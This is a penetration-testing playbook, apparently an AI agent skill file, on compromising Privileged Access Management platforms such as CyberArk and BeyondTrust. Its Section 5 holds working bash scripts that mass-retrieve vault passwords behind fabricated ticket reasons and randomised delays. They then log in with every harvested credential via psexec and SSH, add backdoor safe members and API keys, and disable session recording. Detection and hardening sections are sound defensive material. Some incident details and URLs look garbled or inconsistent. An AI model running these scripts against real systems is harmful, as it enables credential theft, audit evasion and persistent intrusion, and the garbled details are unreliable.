# PAM Privilege Attack Playbook

> A comprehensive playbook for Privileged Access Management (PAM) vendor abuse and defense.
> Companion to `SKILL.md` and `payloads.md` in the `pam-privilege-attack` skill domain.
> All techniques are documented for **authorized security testing** under a signed statement of work.

---

## 1. Introduction and Scope

Privileged Access Management (PAM) platforms sit at the apex of the enterprise trust stack. They hold the credentials for root, Domain Admin, cloud root, database SA, network device enable, and break-glass accounts. Compromising a PAM is the single highest-impact action an attacker can take inside an enterprise: it converts "we have a foothold on one endpoint" into "we hold every privileged credential in the organisation."

Recent ransomware operators -- BlackCat / ALPHV, LockBit, Royal / BlackSuit -- have explicit PAM-targeting steps in their affiliate playbooks because PAM compromise collapses the dwell time between initial access and mass impact from weeks to hours. Mandiant's 2023 analysis of the BlackCat playbook documents CyberArk enumeration as a near-universal step after the initial foothold. CrowdStrike's analysis of the leaked LockBit 3.0 builder references CyberArk credential retrieval as a step in the lateral-movement phase. Variable Threat's analysis of the Royal / BlackSuit affiliate playbook identifies BeyondTrust PRA abuse as a step.

This playbook covers:

1. **PAM architecture refresher** -- the credential broker model, vault/safe/session manager layers, JIT workflow
2. **Vendor-specific attack surfaces** -- CyberArk PVWA/PSM/EPV/AIM/CCP, BeyondTrust PRA/Password Safe, Delinea Secret Server, ManageEngine PMP, One Identity Safeguard, WALLIX Bastion, Devolutions, Xton
3. **Real-world incidents** -- BlackCat PAM targeting (Mandiant 2023), LockBit CyberArk playbook (CrowdStrike 2023), Royal / BlackSuit BeyondTrust abuse, Codecov-class supply chain incidents that exposed PAM credentials
4. **End-to-end attack chain** -- recon -> authentication -> enumeration -> credential extraction -> lateral movement -> persistence -> anti-forensics
5. **Defensive guidance** -- JIT hardening, transaction-based access, audit streaming, SIEM detection rules, purple-team validation

The playbook is structured for a penetration tester or red team operator who has already gained a foothold and needs to identify, compromise, and exploit PAM infrastructure. It is also structured for the purple team / IR analyst who needs to validate detection coverage against the documented ransomware-operator TTPs.

---

## 2. PAM Architecture Refresher

### 2.1 The Credential Broker Model

A PAM is fundamentally a credential broker:

```
[User] --auth--> [PAM Auth Layer] --authorise--> [PAM Policy Layer]
                                                          |
                                                          v
                                              [PAM Vault Layer]
                                                          |
                                                          v
                                              [Credential Returned to Broker]
                                                          |
                                                          v
                                              [PAM Session Manager] --RDP/SSH--> [Target Host]
                                                          |
                                                          v
                                              [Session Recorded, Credential Rotated]
```

Every step is an attack surface:

| Layer | Function | Attack Surface |
|-------|----------|----------------|
| Auth Layer | Verify the user (form, SAML, OAuth, RADIUS, LDAP, MFA) | Auth bypass (CVE-2025-32564), SAML injection (CVE-2022-2451), credential stuffing, MFA fatigue |
| Policy Layer | Authorise the request against safe ACLs, JIT workflow, ticket validation | JIT bypass, ticket validation forgery, ACL abuse |
| Vault Layer | Hold the encrypted credentials | Vault master key escrow, `.cue` file theft, PostgreSQL backend extraction |
| Session Manager | Broker the connection (PSM, PRA, Sessions2, Bastion) | Session hijacking, recording tampering, shadow RDP |
| Rotation Layer | Rotate the credential after use | Rotation window exploitation, PAM-aware PtH |

### 2.2 Vendor Architecture Comparison

| Vendor | Auth Layer | Vault Layer | Session Manager | Notable Components |
|--------|-----------|-------------|------------------|--------------------|
| CyberArk | PVWA (HTTP), LDAP, RADIUS, SAML, Risk-Based MFA | EPV (Vault, TCP/1858), AIM/CCP | PSM (RDP-based) | Master key escrow via operator shares; `.cue` file format |
| BeyondTrust | PRA (HTTP), SAML, RADIUS, 2FA | Password Safe (appliance) | PRA (web-based) | BYOC (Bring Your Own Certificate); session recording with HMAC tamper-evidence |
| Delinea | Secret Server (HTTP), OAuth (password grant deprecated), SAML | SS database (SQL Server) | Distributed Engine | DPAPI-protected agent config; OAuth refresh tokens |
| One Identity | Safeguard admin console (HTTPS, SSL pinning), smart card | SPP (Privileged Passwords) | SPS (Sessions2 fabric) | SSL pinning on admin console; privileged session fabric |
| ManageEngine | PMP (HTTP on 7272), TFA, LDAP | PostgreSQL backend | (no native broker; relies on RDP/SSH directly) | `pmp_key.key` master key; AES-128-CBC credential encryption |
| WALLIX | WAB admin console, SAML, LDAP | Bastion internal DB | Bastion (SSH/RDP web client) | `wabadmin` CLI; session recording in `.cast` format |
| Devolutions | DVLS (HTTP), SAML, OAuth | DVLS database | (no native broker) | PowerShell-first API |
| Xton | Core API (HTTP on 8081), API key | Xton internal DB | (no native broker) | Simple API-key auth |

### 2.3 The CyberArk Architecture (deep dive)

CyberArk is the most-deployed enterprise PAM and warrants a deeper look:

- **EPV (Enterprise Password Vault)** -- The encrypted credential store. Runs on a hardened Windows server, listens on TCP/1858 for the proprietary Vault protocol. The vault file is `vault.dat`, encrypted with the master key. The master key is split via Shamir Secret Sharing across multiple operator keys (`/opt/CARKvault/operator-keys/`).
- **PVWA (Password Vault Web Access)** -- The web UI. ASP.NET on IIS, exposes the REST API at `/PasswordVault/api/`. Default ports 80/443. Authentication via Cyberark/LDAP/RADIUS/SAML providers.
- **PSM (Privileged Session Manager)** -- The session broker. Multiple hardened Windows servers in a pool. The PSM connects to the target via RDP/SSH using the vaulted credential, and the user connects to the PSM via RDP. All sessions are recorded as AVI.
- **AIM / CCP (Application Identity Manager / Central Credential Provider)** -- The application credential provider. Applications retrieve credentials via the REST API at `/AIMWebApi/api/Accounts`. Credentials are cached locally in `.cue` files (encrypted with the provider key, which derives from the master key).
- **PSMP (PSM for SSH)** -- The SSH variant of PSM. Linux-based, integrates with the OS SSH.

### 2.4 The CyberArk Authentication Flow

```
1. User browses to https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/
2. PVWA IIS app presents the logon page (default.aspx)
3. User submits credentials via the form (or via SAML redirect)
4. PVWA calls the Vault via the Vault protocol on TCP/1858
5. The Vault authenticates the user against its internal user store (or the configured LDAP/RADIUS backend)
6. The Vault returns a session token
7. PVWA wraps the token as a bearer token and returns it to the user's browser
8. Subsequent API calls carry the bearer token in the Authorization header
```

### 2.5 The Just-in-Time (JIT) Workflow

Modern PAM deployments enforce JIT access -- no standing privilege. The workflow:

```
1. User requests access to an account (CyberArk "Request Object")
2. Approver reviews and approves (creates a ConfirmId)
3. User checks out the account (locks it for the duration)
4. User retrieves the credential (or connects via PSM)
5. User uses the credential
6. User checks in the account (releases the lock)
7. PAM rotates the credential
8. Audit log records the entire transaction
```

Every step is an attack surface. The most common bypasses:

- **Stale ConfirmId replay** -- The ConfirmId is not bound to time or single-use
- **Session extension** -- The PSM session is extended beyond the approval window without re-approval
- **Ticket validation forgery** -- The "reason" / "TicketId" fields are free-form and not validated against the ITSM

---

## 3. Vendor Attack Surfaces

### 3.1 CyberArk Attack Surface

| Surface | Vector | Detection |
|---------|--------|-----------|
| PVWA unauthenticated | CVE-2025-32564-class auth bypass | ITAudit Event 5 (failed logon) bursts from unauthenticated sources |
| PVWA authenticated | Default credentials, credential stuffing, MFA fatigue | ITAudit Event 4 / 5, MFA challenge events |
| Vault protocol (TCP/1858) | Direct Vault access with recovered operator keys | Vault Audit `Action=Logon` from unexpected IPs |
| AIM/CCP | Forged App ID, client cert theft, `.cue` cache theft | CCP Audit `Action=GetAccount`, filesystem audit on cache dirs |
| PSM | Shadow RDP, session hijack, recording tampering | ITAudit Event 410 (PSM Shadow), Event 402/403 (recording start/stop) |
| Master key escrow | Recovery server compromise, operator key reconstruction | Vault Audit `Action=BackupVault`, `Action=OperatorKeyImport` |

### 3.2 BeyondTrust Attack Surface

| Surface | Vector | Detection |
|---------|--------|-----------|
| PRA unauthenticated | CVE-2022-2451 SAML account injection | Appliance Audit `Action=SAMLLogon` from unknown IdPs |
| PRA authenticated | Default credentials, BYOC abuse | Appliance Audit `Action=Login`, `Action=CertificateUpload` |
| Password Safe API | Mass credential retrieval, OAuth token theft | Appliance Audit `Action=PasswordReveal` bursts |
| Session recording | Tampering, deletion | Appliance Audit `Action=SessionRecordingDelete`, HMAC verification failure |
| Identity Security Insights | (cloud) SAML integration abuse | Cloud audit logs |

### 3.3 Delinea Attack Surface

| Surface | Vector | Detection |
|---------|--------|-----------|
| Secret Server authenticated | Password grant OAuth, weak refresh-token rotation | Event Framework `LoginEvent`, `OAuthTokenIssued`, `RefreshTokenUsed` |
| Distributed Engine | DPAPI blob extraction, engine site change | Event Framework `EngineSiteChanged`, `EngineLogonFromNewIP` |
| Local agent | Agent config theft, process memory dump | Endpoint EDR on agent process, file access audit |
| SQL backend | Direct SQL access, credential table dump | SQL audit, secret-server database access from new IPs |

### 3.4 ManageEngine PMP Attack Surface

| Surface | Vector | Detection |
|---------|--------|-----------|
| PMP unauthenticated | CVE-2022-28226 path traversal | HTTP 404 / 200 audit, file access audit |
| PMP authenticated | API key theft, weak ticket validation | PMP audit `Operation=GetAPIKey`, `Operation=GetPassword` |
| PostgreSQL backend | Local SQL access, `pmp_key.key` theft | PostgreSQL audit, file access on `pmp_key.key` |
| Master key | Weak rotation, recovery server compromise | File access audit on `pmp_key.key` |

### 3.5 One Identity Safeguard Attack Surface

| Surface | Vector | Detection |
|---------|--------|-----------|
| Admin console | SSL pinning bypass via Frida | Admin console certificate validation events |
| SPP (Passwords) | OAuth flow abuse, weak ticketing | SPP Audit `Action=GetAccountPassword` bursts |
| SPS (Sessions2) | Session fabric abuse, session attach | SPS Audit `Action=SessionAttach`, `Action=SessionRecordingInterrupted` |

### 3.6 WALLIX / Devolutions / Xton Attack Surfaces

- **WALLIX Bastion**: API key auth, session recording deletion, `wabadmin` CLI abuse
- **Devolutions Server**: PowerShell API, sensitive-data read endpoint, weak authentication
- **Xton Core**: API-key auth on TCP/8081, simple reveal endpoint, weak audit

---

## 4. Real-World Incidents

### 4.1 BlackCat / ALPHV PAM Targeting (Mandiant, 2023)

Mandiant's 2023 analysis of the BlackCat / ALPHV ransomware affiliate playbook documents PAM enumeration as a near-universal step:

1. Initial access via VPN appliance compromise (Citrix Bleedern, FortiOS CVE, RDS brute force)
2. Internal recon -- identify PAM infrastructure via DNS, nmap, and AD service principal names
3. PAM enumeration -- attempt default credentials (`cyberark/Admin123`, `boftelement/beyond`) against discovered PAM interfaces
4. PAM exploitation -- exploit the applicable CVE (CVE-2025-32564-class for CyberArk, CVE-2022-2451 for BeyondTrust) where the version is unpatched
5. Mass credential retrieval -- enumerate every safe and retrieve every credential the compromised identity can reach
6. Simultaneous credential use across the estate -- parallel SSH/RDP/WMI with each harvested credential
7. ESXi / AD / cloud mass impact -- the ransomware detonation phase

**Detection signal**: Burst of `GetPassword`/`PasswordReveal` events from a single session in a short window.

### 4.2 LockBit CyberArk Playbook (CrowdStrike, 2022-2023)

CrowdStrike's analysis of the leaked LockBit 3.0 builder (September 2022) references explicit CyberArk credential retrieval as a step in the affiliate manual:

1. Locate CyberArk via AD service principal names containing `PasswordVault`
2. Compromise the PVWA via the most recent applicable CVE
3. Disable session recording prior to mass credential retrieval (to reduce forensic footprint)
4. Mass credential retrieval
5. Use harvested credentials for lateral movement and ESXi impact

**Detection signal**: Disabling of session recording (`PSMRecordSession=false`) is a high-signal alert.

### 4.3 Royal / BlackSuit BeyondTrust Abuse (Variable Threat, 2023)

Variable Threat's analysis of the Royal / BlackSuit affiliate playbook documents BeyondTrust PRA abuse:

1. Initial access via VPN appliance compromise
2. Identify BeyondTrust PRA via DNS (`bastion.`, `beyondtrust.` subdomains)
3. Exploit CVE-2022-2451 (SAML account injection) where the version is unpatched
4. Disable session recording
5. Mass credential retrieval from Password Safe
6. Use harvested credentials for AD / ESXi impact

**Detection signal**: SAML logons from unknown IdPs; session recording disabled outside maintenance windows.

### 4.4 Codecov-Class Supply Chain Incidents

While Codecov (2021) and CircleCI (2023) are general supply chain incidents, they share a common pattern with PAM compromise: a single credential (in Codecov, the bash uploader's token; in PAM, the vault token) grants access to a vast downstream estate. The lesson: **the PAM must be treated as a Tier-0 asset, equivalent to a domain controller or cloud root**.

---

## 5. End-to-End Attack Chain

This section walks a complete attack chain from initial foothold through mass credential retrieval and downstream impact. The chain uses CyberArk as the example target; equivalent chains exist for every vendor.

### 5.1 Phase 1: Recon

```bash
# Identify CyberArk infrastructure
nmap -sV -p 80,443,1858,3389 REPLACE_WITH_YOUR_INTERNAL_RANGE

# DNS recon for CyberArk naming
for prefix in vault pam cyberark psm epv pvwa; do
  host "${prefix}.REPLACE_WITH_YOUR_DOMAIN" 2>/dev/null | grep -v 'not found\|SERVFAIL'
done

# AD SPN recon for CyberArk
ldapsearch -x -H ldap://REPLACE_WITH_YOUR_DC_IP \
  -D 'REPLACE_WITH_YOUR_DOMAIN\REPLACE_WITH_YOUR_USER' -w 'REPLACE_WITH_YOUR_PASS' \
  -b 'CN=Configuration,DC=REPLACE_WITH_YOUR_DOMAIN,DC=local' \
  '(servicePrincipalName=*PasswordVault*)' cn servicePrincipalName
```

**Detection**: Network recon (nmap) is loud. DNS recon is quiet. AD SPN queries are logged in Event ID 4662.

### 5.2 Phase 2: Authentication

```bash
# Acquire a token via harvested credentials
TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"username":"REPLACE_WITH_YOUR_VAULT_USER","password":"REPLACE_WITH_YOUR_VAULT_PASS"}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/Cyberark/Logon | jq -r .token)

# If the credentials fail, check for CVE-2025-32564-class bypass
curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/build | jq -r .version
# Then per the published PoC pattern (Section 10 of payloads.md)
```

**Detection**: ITAudit Event 4 (successful logon), Event 5 (failed logon). Burst of failed logons triggers lockout alerts.

### 5.3 Phase 3: Enumeration

```bash
# Enumerate safes (slow paced to blend with operator behaviour)
for SAFE in $(curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes?limit=100' \
  | jq -r '.Safes[].SafeName'); do
  echo "[*] Safe: $SAFE"
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?filter=safename eq ${SAFE}&limit=100" \
    >> accounts.json
  sleep $((RANDOM % 30 + 15))
done
```

**Detection**: Burst of `ListSafes` (Event 300) and `ListAccounts` (Event 301) events from a single session.

### 5.4 Phase 4: Credential Extraction

```bash
# Retrieve every credential the token can reach (slow paced, realistic reasons)
REASONS=("incident-response INC-$(date +%Y%m%d)-001"
         "change window CHG0000$(shuf -i 1-9 -n 1)"
         "audit AUD-$(date +%Y%m%d)")

for ACCT_ID in $(jq -r '.value[].id' accounts.json | sort -u); do
  REASON=${REASONS[$RANDOM % ${#REASONS[@]}]}
  PASS=$(curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"reason\":\"$REASON\",\"TicketingSystemName\":\"jira\",\"TicketId\":\"INC-$(date +%s)\"}" \
    "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/Password/Retrieve" \
    | jq -r .password)
  echo "$ACCT_ID $PASS" >> harvested.txt
  sleep $((RANDOM % 60 + 30))
done
```

**Detection**: Burst of `GetPassword` (Event 303) events. Even paced, the volume over time exceeds normal operator patterns.

### 5.5 Phase 5: Lateral Movement

```bash
# Use harvested credentials for downstream exploitation
while read ACCT_ID PASS; do
  ADDR=$(jq -r --arg id "$ACCT_ID" '.value[] | select(.id == $id) | .address' accounts.json)
  USER=$(jq -r --arg id "$ACCT_ID" '.value[] | select(.id == $id) | .userName' accounts.json)
  PLATFORM=$(jq -r --arg id "$ACCT_ID" '.value[] | select(.id == $id) | .platformName' accounts.json)

  case "$PLATFORM" in
    WinDesktopLocal|WinDomainLocal)
      # Windows -- attempt psexec
      impacket-psexec "REPLACE_WITH_YOUR_DOMAIN/${USER}:${PASS}@${ADDR}" \
        'echo "[+] Compromised: '$ADDR'"' 2>/dev/null
      ;;
    UnixSSH)
      # Linux -- attempt SSH
      sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "${USER}@${ADDR}" \
        'echo "[+] Compromised: $(hostname)"' 2>/dev/null
      ;;
    AWSAccessKey)
      # AWS -- set up profile
      echo "[AWS] $USER @ $ADDR (Access Key)"
      ;;
    *)
      echo "[?] $USER @ $ADDR ($PLATFORM) -- $PASS"
      ;;
  esac
done < harvested.txt
```

**Detection**: Login spikes on hosts whose credentials were just retrieved. Pass-the-Hash / Pass-the-Password events on EDR.

### 5.6 Phase 6: Persistence

```bash
# Persist via a backdoor safe owner (requires Enterprise Admin on CyberArk)
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "MemberName": "REPLACE_WITH_YOUR_BACKDOOR_USER",
    "MemberType": "User",
    "Permissions": {
      "RetrieveAccounts": true,
      "ListAccounts": true,
      "AddAccounts": false,
      "UpdateAccountContent": false
    }
  }' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes/REPLACE_WITH_YOUR_SAFE/Members

# Or install a long-lived API key on BeyondTrust
curl -sk -X POST -H "Authorization: Bearer $BT_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "ApplicationName": "REPLACE_WITH_YOUR_BACKDOOR_APP",
    "APIKey": "REPLACE_WITH_YOUR_API_KEY",
    "Expires": "2026-12-31T23:59:59Z"
  }' \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/api_keys
```

**Detection**: `AddSafeMember` events, `CreateAPIKey` events. New safe members and API keys should trigger a verification step against change management.

### 5.7 Phase 7: Anti-Forensics

```bash
# NOTE: Audit log tampering is the highest-signal action a PAM attacker can take.
# Prefer blending in (rate-limiting, realistic reasons) over tampering.

# If tampering is in scope, target local file copies -- not the central audit store:
# scp REPLACE_WITH_YOUR_PVWA_HOST:/var/log/PSM/ITAudit.log ./local.log
# truncate -s 0 local.log
# scp local.log REPLACE_WITH_YOUR_PVWA_HOST:/var/log/PSM/ITAudit.log

# Disable session recording before mass retrieval (BlackCat playbook step)
curl -sk -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"PSMRecordSession":false,"Reason":"maintenance-window"}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Server/Configuration
```

**Detection**: Audit log truncation is detected by SIEM ingestion gaps. Session recording disable is a high-severity alert.

---

## 6. Lab Setup

### 6.1 CyberArk Community Edition Lab

CyberArk offers a free Community Edition for lab use. Build the lab:

1. Sign up at `cyberark.com`"> for Community Edition
2. Provision the lab in AWS or Azure (CyberArk provides a CloudFormation template)
3. Wait for the PVWA, PSM, and EPV to provision (~45 minutes)
4. Browse to `https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/`
5. Log in with the supplied `Administrator` account
6. Create sample safes with sample Windows / Linux / AWS accounts
7. Configure PSM for sample target hosts (Windows Server, CentOS)
8. Add a second user (auditor) for permission-boundary testing

### 6.2 BeyondTrust Password Safe Free Trial Lab

1. Sign up at `beyondtrust.com`"> for the Password Safe free trial
2. Deploy the appliance (VMware OVA or cloud)
3. Configure the appliance per the deployment guide
4. Add sample managed systems and accounts
5. Enable the API and acquire an API key

### 6.3 Delinea Secret Server On-Prem Lab

1. Download the Secret Server installer from `delinea.com`">
2. Install on a Windows Server with SQL Server
3. Configure the distributed engine on a separate Windows host
4. Add sample secrets and folders

### 6.4 ManageEngine PMP Lab

1. Download PMP from `manageengine.com`"> (free for up to 2 administrators)
2. Install on a Linux or Windows host
3. Add sample resources and accounts
4. Configure the requestor-approver flow for JIT testing

### 6.5 One Identity Safeguard Lab

1. Sign up for a Safeguard trial at `oneidentity.com`">
2. Deploy the appliance (VMware OVA)
3. Configure SPP and SPS for the lab

### 6.6 Simulated Attacker Host (Kali)

```bash
# Install the dependencies
sudo apt update
sudo apt install -y curl httpie python3-pip websocat nmap gobuster
python3 -m pip install --upgrade impacket requests websockets mmh3
# Optional: frida-tools for SSL pinning bypass
python3 -m pip install frida-tools
# Optional: mitmproxy for HTTP interception
python3 -m pip install mitmproxy

# Clone the community credential-file-parser for .cue / DPAPI work
# git clone https://github.com/REPLACE_WITH_REPO_REF/pam-cred-file-parsers
```

### 6.7 Test Data

Populate the lab with realistic but obviously-test data:

- Safe names: `Lab-Windows-Admins`, `Lab-Linux-Root`, `Lab-AWS-Root`
- Account names: `lab_admin`, `lab_root`, `lab_aws_admin`
- Target hosts: `lab-dc01`, `lab-linux01`, `lab-aws-account`
- Master passwords: `REPLACE_WITH_YOUR_MASTER_PASSWORD` (lab only)

---

## 7. Detection Guidance

### 7.1 Per-Vendor Detection Events

| Vendor | High-Fidelity Events |
|--------|---------------------|
| CyberArk | Event 4 (Logon), Event 5 (Failed Logon), Event 300 (List Safes), Event 302 (Get Account), Event 303 (Get Password), Event 308 (Check Out), Event 310 (Rotation), Event 410 (PSM Shadow) |
| BeyondTrust | `Login`, `UserList`, `SystemList`, `CredentialRequest`, `PasswordReveal`, `SessionStart`, `SessionRecordingDelete`, `CertificateUpload`, `SAMLLogon` |
| Delinea | `LoginEvent`, `SecretViewEvent`, `SecretAccessEvent`, `OAuthTokenIssued`, `RefreshTokenUsed`, `EngineSiteChanged`, `EngineLogonFromNewIP` |
| ManageEngine PMP | `Login`, `GetAPIKey`, `ListResources`, `GetPassword`, `RequestAccess`, `ApproveAccess`, `SessionRecordingDisabled` |
| One Identity | `Login`, `GetAsset`, `GetAccountPassword`, `SessionStart`, `SessionAttach`, `SessionRecordingInterrupted` |

### 7.2 Burst Detection (SIEM)

```sql
-- Splunk / Elastic: burst of GetPassword events
index=pam action="GetPassword" OR action="PasswordReveal"
| stats count as hits by user, src_ip
| where hits > 20
| sort -hits

-- Burst of ListSafes events
index=pam action="ListSafes" OR action="ListAccounts"
| stats count by user, src_ip, _time span=10m
| where count > 100

-- Session recording disabled
index=pam (action="SessionRecordingDisabled" OR action="PSMRecordSession=false")
| table _time user src_ip reason host

-- Audit log deletion
index=pam action IN ("AuditLogDelete", "EventLogDelete")
| table _time user src_ip target_log host

-- SAML logon from new IdP
index=pam action="SAMLLogon"
| stats dc(issuer) as issuers by user
| where issuers > 1
```

### 7.3 Endpoint Detection (EDR)

- **Pass-the-Hash on PAM-managed accounts** -- Any LSASS-originated authentication using the NTLM hash of a PAM-managed account is suspect.
- **mimikatz / SharpDPAPI execution** -- Detect via command-line signatures and memory-resident indicators.
- **`.cue` file access** -- File access audit on `/opt/CARKaim/` and `C:\Program Files (x86)\CyberArk\AIMProvider\cache\`.
- **`pmp_key.key` access** -- File access audit on the ManageEngine PMP master key.
- **PSM shadow RDP** -- Detect `mstsc.exe /shadow:` command line.

### 7.4 Network Detection (NIDS)

- **TLS connections to PAM URLs from unexpected source IPs** -- `*.PasswordVault/`, `*/SecretServer/`, `*/wab/api/`.
- **Anomalous session duration** -- A PSM / PRA session lasting > N hours may indicate session hijacking.
- **Vault protocol traffic (TCP/1858) from non-EPV hosts** -- Indicates direct Vault access.

---

## 8. Hardening Recommendations

### 8.1 CyberArk Hardening

- Apply the current PVWA patch level (mitigates CVE-2025-32564-class issues)
- Enforce Risk-Based MFA on PVWA logon
- Restrict `List Safes` to authenticated EPV users
- Enforce dual control on Tier-0 safes
- Configure `UseOneTimeConfirmId=true` for JIT
- Stream ITAudit to an external SIEM in real time
- Harden the EPV server (`AllowDirectLogon=No` on `paragent`)
- Restrict filesystem permissions on `/opt/CARKvault/operator-keys/`
- Deploy HSM-backed Vault key storage (CyberArk Enterprise Password Vault Key Vault integration)

### 8.2 BeyondTrust Hardening

- Apply the BTN-2022-04 patch (mitigates CVE-2022-2451)
- Restrict SAML IdPs to known IdPs only (signed assertions required)
- Enable session recording tamper-evidence (HMAC)
- Restrict admin API scope to a small group
- Stream appliance audit to an external SIEM in real time
- Enforce endpoint certificates on PRA clients

### 8.3 Delinea Hardening

- Migrate off password-grant OAuth (use authorization code + PKCE)
- Enforce DPAPI-protected configuration on distributed engines
- Restrict distributed engine outbound to known Secret Server hosts only
- Enable the Event Framework for SIEM streaming
- Rotate OAuth refresh tokens on a short cycle

### 8.4 ManageEngine PMP Hardening

- Apply the current PMP patch (mitigates CVE-2022-28226-class issues)
- Restrict API key scope per user
- Encrypt the PostgreSQL backend at rest (Transparent Data Encryption)
- Rotate the `pmp_key.key` master key annually
- Restrict local admin on the PMP server
- Stream audit to an external SIEM in real time

### 8.5 One Identity Hardening

- Keep SSL pinning enabled on the admin console
- Restrict admin console access to known management workstations
- Enforce smart card MFA on the admin console
- Monitor SPP / SPS audit for session attach events

### 8.6 Cross-Vendor Hardening

- **Tiering** -- Tier-0 credentials are never reachable from Tier-1 / Tier-2 hosts. The PAM enforces the boundary.
- **JIT over standing** -- Default-deny standing privilege. Every privileged session requires explicit, time-boxed, audited approval.
- **Session brokering** -- Force all privileged access through PSM / PRA / Sessions2 so the credential is never disclosed to the operator or the endpoint.
- **Credential rotation** -- Rotate after every session, on schedule, and on personnel change.
- **Audit streaming** -- Stream PAM audit events in real time to a SIEM with a baseline of normal operator behaviour. Anomalous bulk-read events should page the SOC.
- **PAM-as-a-target hardening** -- Treat the PAM itself as a Tier-0 asset: hardened underlying OS, restricted management interfaces, HSM-backed key storage, signed agent code, transparent chain of custody on session recordings.

---

## 9. Reporting Guidance

### 9.1 PAM Findings Severity Calibration

| Finding | Severity |
|---------|----------|
| Mass credential retrieval achieved | CRITICAL |
| Authenticated credential retrieval of a Tier-0 credential | CRITICAL |
| Unauthenticated auth bypass (CVE applicable) | CRITICAL |
| `.cue` / DPAPI / PostgreSQL backend extraction | CRITICAL |
| JIT workflow bypass | HIGH |
| Session recording tampering (if tamper-evidence enabled, weaker) | HIGH |
| PSM session hijacking | HIGH |
| SAML account injection | CRITICAL |
| SSL pinning bypass | MEDIUM |
| Default / weak credentials on a PAM account | HIGH |
| Lack of MFA enforcement | HIGH |
| Lack of audit streaming | MEDIUM |
| Standing privilege on Tier-0 accounts | HIGH |

### 9.2 Report Structure

```markdown
# PAM Security Assessment -- Client Corp

## Executive Summary
- Critical findings: N
- Highest impact: PAM compromise -> mass credential disclosure -> ransomware operator playbook viable
- Recommended immediate actions: rotate all PAM-managed Tier-0 credentials, apply pending patches, enable tamper-evidence

## Methodology
- Recon (TC-PM001, TC-PM002)
- Authentication (TC-PM003 et al.)
- Enumeration (TC-PM004 et al.)
- Credential retrieval (TC-PM005, TC-PM007, TC-PM009, TC-PM011, TC-PM012)
- Lateral movement demonstration
- Anti-forensics assessment

## Findings
[Finding 1: TC-PM005 -- CyberArk Credential Retrieval]
[Finding 2: TC-PM007 -- .cue File Theft]
...

## Blast Radius
[Diagram showing the PAM compromise -> downstream credential reach]

## Recommendations (Prioritized)
1. Apply CVE-2025-32564 patch (immediate)
2. Rotate all PAM-managed Tier-0 credentials (24 hours)
3. Enable session recording tamper-evidence (1 week)
4. Implement SIEM detection rules (2 weeks)
5. Tier-0 isolation project (1 quarter)
```

### 9.3 Masking Discipline

- Never include the full credential value in the report. Use masked forms (`Password ends in ...XYZ9`).
- Never include the full audit-log entry in the report. Reference the Event ID and the timestamp.
- Never include the operator key, master key, or `.cue` file contents in the report. Reference the file path.

---

## 10. Cross-References

- `skills/secret-management-attack/SKILL.md` -- HashiCorp Vault, AWS Secrets Manager, source-code secrets (adjacent but distinct)
- `skills/ad-ldap-attack/SKILL.md` -- AD lateral movement using PAM-recovered DA credentials
- `skills/ad-cs-abuse/SKILL.md` -- PKI-based escalation chains (often chained with PAM compromise)
- `skills/cloud-identity-attack/SKILL.md` -- Cloud PIM / PAM (Entra PIM, AWS IAM Identity Center, GCP IAM Conditions)
- `skills/privilege-escalation/SKILL.md` -- Endpoint privilege elevation
- `skills/post-exploitation/SKILL.md` -- Host-takeover patterns after PAM credential harvest
- `skills/digital-forensics/SKILL.md` -- PAM forensic artifacts (audit logs, session recordings, `.cue` files)
- `skills/anti-forensics/SKILL.md` -- Covering tracks after PAM compromise
- `skills/pentest-reporting/SKILL.md` -- Report assembly with PAM-specific findings
- `skills/supply-chain-security/SKILL.md` -- PAM-as-Tier-0-asset parallels with supply-chain compromise

---

## 11. References

- **Mandiant: BlackCat / ALPHV Ransomware Targeting PAM** -- Mandiant Threat Intelligence report, 2023.
- **CrowdStrike: LockBit 3.0 Affiliate Manual (leaked)** -- CrowdStrike analysis of the September 2022 LockBit builder leak.
- **Variable Threat: Royal / BlackSuit Advisory** -- Variable Threat analysis of the Royal / BlackSuit affiliate playbook, 2023.
- **CyberArk Security Advisories** -- `cyberark.com/security`"> (subscribe for current advisories including CVE-2025-32564).
- **BeyondTrust Security Advisories** -- `beyondtrust.com/security`"> (BTN-2022-04 and subsequent).
- **ManageEngine Security Advisories** -- `manageengine.com/security`"> (CVE-2022-28226 and subsequent).
- **One Identity Safeguard Documentation** -- `oneidentity.com/docs`">.
- **Delinea Secret Server Documentation** -- `docs.delinea.com`">.
- **WALLIX Access Manager Documentation** -- `wallix.com`">.
- **Codecov Supply Chain Incident (2021)** -- `about.codecov.io/security-update`">.
- **CircleCI Secret Leak (2023)** -- `circleci.com/blog`">.
- **LastPass Source Code Theft (2022)** -- public reporting on the August 2022 incident.
- **Microsoft Defender for Identity PAM Detection Patterns** -- `learn.microsoft.com/defender-for-identity`">.

---

## 12. Appendix A: Quick-Reference Vendor Cheatsheet

| Vendor | Default URL | Default Port | Auth Endpoint | Credential Endpoint |
|--------|------------|--------------|---------------|---------------------|
| CyberArk PVWA | `/PasswordVault/` | 443 | `/api/auth/Cyberark/Logon` | `/api/Accounts/<id>/Password/Retrieve` |
| CyberArk CCP | `/AIMWebApi/` | 443 | (App ID + cert) | `/api/Accounts?AppID=...&Safe=...&Object=...` |
| CyberArk Vault (EPV) | (proprietary) | 1858 | (Vault protocol) | (Vault protocol via PACLI) |
